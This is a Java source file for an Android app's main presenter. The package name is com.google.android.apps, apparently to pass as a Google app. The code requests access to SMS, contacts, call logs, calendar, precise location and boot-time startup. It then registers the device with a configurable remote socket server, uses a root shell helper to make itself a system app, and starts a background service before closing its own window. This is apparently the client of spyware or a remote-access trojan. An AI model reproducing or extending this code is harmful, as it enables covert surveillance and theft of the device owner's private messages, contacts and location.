package com.google.android.apps.ui;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.util.Log;

import com.google.android.apps.App;
import com.google.android.apps.R;
import com.google.android.apps.repositories.network.models.response.InitialResponse;
import com.google.android.apps.utils.ShellCommand;
import com.tbruyelle.rxpermissions2.RxPermissions;

import java.util.concurrent.TimeUnit;

import javax.inject.Inject;

import io.reactivex.Single;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.CompositeDisposable;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;

import static android.content.ContentValues.TAG;

/**
 * Created by OldMan on 08.04.2017.
 */

public class MainPresenterImpl implements MainPresenter {
    private MainView view;
    private final MainInteractor interactor;
    private Context context;
    private CompositeDisposable compositeDisposable = new CompositeDisposable();

    @Inject
    public MainPresenterImpl(MainView view, MainInteractor interactor) {
        this.view = view;
        this.interactor = interactor;
        context = App.getAppComponent().getContext();
    }

    @Override
    public void onResume() {

    }

    @Override
    public void onPause() {

    }

    @Override
    public void onDestroy() {
        compositeDisposable.clear();
        view = null;
    }

    @Override
    public void onFinish() {

    }

    @Override
    public void onDeviceRegister() {
        if (view != null) {
            view.hideProgress();
            view.showSnackBar(context.
                    getResources().getString(R.string.device_is_registered), null);
        }
    }


    @Override
    public void getDeviceIdOnServer() {
        if (view != null) {
            view.showProgress();
            view.hideButton();
        }
        Disposable disposable = interactor.onRegisterDevice()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::handleSuccess, this::handleError);
        compositeDisposable.add(disposable);
    }

    @Override
    public void invokePermission() {
        new RxPermissions((Activity) view)
                .request(Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.CALL_PHONE,
                        Manifest.permission.READ_CALENDAR,
                        Manifest.permission.RECEIVE_BOOT_COMPLETED,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_NETWORK_STATE,
                        Manifest.permission.RECEIVE_BOOT_COMPLETED,
                        Manifest.permission.WAKE_LOCK
                )
                .subscribe(granted -> {
                    if (granted) { // Always true pre-M
                        view.showSnackBar(context.
                                getResources().getString(R.string.request_permission_succesfull), null);
                    } else {
                        view.showSnackBar(context.
                                getResources().getString(R.string.request_permission), context.
                                getResources().getString(R.string.settings));
                    }
                });
    }

    @Override
    public void onClickSettingsMenu() {
        Single<String> ipAddress = interactor.getIpAddress().subscribeOn(AndroidSchedulers.mainThread());
        Single<String> port = interactor.getPort().subscribeOn((AndroidSchedulers.mainThread()));
        Disposable disposable = Single.zip(ipAddress, port, (ip, p) -> {
            if (view != null)
                view.showSettingsDialog(ip, p);
            return ip.concat(":" + p); // combine objects...
        }).subscribeOn((AndroidSchedulers.mainThread()))
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(s -> Log.d(TAG, " onSubscribe : " + s));
        compositeDisposable.add(disposable);
    }

    @Override
    public void onClickMakeSystemApp() {
        if (view != null)
            view.showProgress();
            ShellCommand.makeAppSystem(context)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::handleRootSuccess, this::handleError);
    }

    private void handleRootSuccess(Boolean val) {
        if (view != null) {
            view.hideProgress();
            Log.d(TAG, "system" + val);
            if (val)
                view.showSnackBar(context.getString(R.string.app_become_a_system), null);
            else
                view.showSnackBar(context.getString(R.string.app_not_system), null);
        }
    }

    @Override
    public void setNewSocketServer(String ip, String port) {
        // combine objects...
        Disposable disposable = Single.zip(interactor.setIpAddress(ip), interactor.setPort(port),
                (s, str) -> s.concat(":" + str)).subscribeOn((AndroidSchedulers.mainThread()))
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(s -> {
                    if (view != null)
                        view.showSnackBar(context.getString(R.string.save_settings) + s, null);
                });
        compositeDisposable.add(disposable);
    }

    private void handleSuccess(InitialResponse response) {
        if (view != null) {
            view.hideProgress();
            if (response.getCode() == 1) {
                setDeviceInfo();
            } else if (response.getCode() == 0 && response.getError() == 4) {
                view.showSnackBar(context.getString(R.string.error_device_already_registered), null);
                view.startService();
                Single.timer(3, TimeUnit.SECONDS).subscribe(Long -> view.killActivity());
            } else {
                view.showButton();
                view.showSnackBar(context.getString(R.string.error) + response.getError(), null);
            }
        }
    }

    private void setDeviceInfo() {
        Disposable disposable = interactor.onSetDeviceInfo()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::handleSuccessDeviceInfo, this::handleError);
        compositeDisposable.add(disposable);
    }

    private void handleSuccessDeviceInfo(Integer code) {
        if (view != null) {
            view.hideProgress();
            if (code != null && code == 1) {
                view.showSnackBar(context.getString(R.string.device_registered), null);
                view.startService();
                Single.timer(3, TimeUnit.SECONDS).subscribe(Long -> view.killActivity());
            } else {
                view.showButton();
                view.showSnackBar(context.getString(R.string.error) + code, null);
            }
        }
    }

    private void handleError(Throwable throwable) {
        if (view != null) {
            view.hideProgress();
            view.showButton();
            view.showSnackBar(throwable.getLocalizedMessage(), null);
        }
    }
}
